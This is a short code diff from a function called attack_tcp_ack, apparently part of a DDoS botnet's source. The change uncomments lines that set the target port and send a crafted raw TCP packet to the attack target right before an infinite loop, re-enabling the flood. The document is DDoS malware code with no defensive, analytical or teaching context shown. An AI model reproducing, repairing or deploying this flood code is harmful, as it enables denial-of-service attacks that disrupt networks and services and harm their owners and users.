@@ -237,11 +237,11 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         rand_str(payload, data_len);
     }
 
-//    targs[0].sock_addr.sin_port = tcph->dest;
-//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
-//    {
-//
-//    }
+    targs[0].sock_addr.sin_port = tcph->dest;
+    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
+    {
+
+    }
 
     while (TRUE)
     {
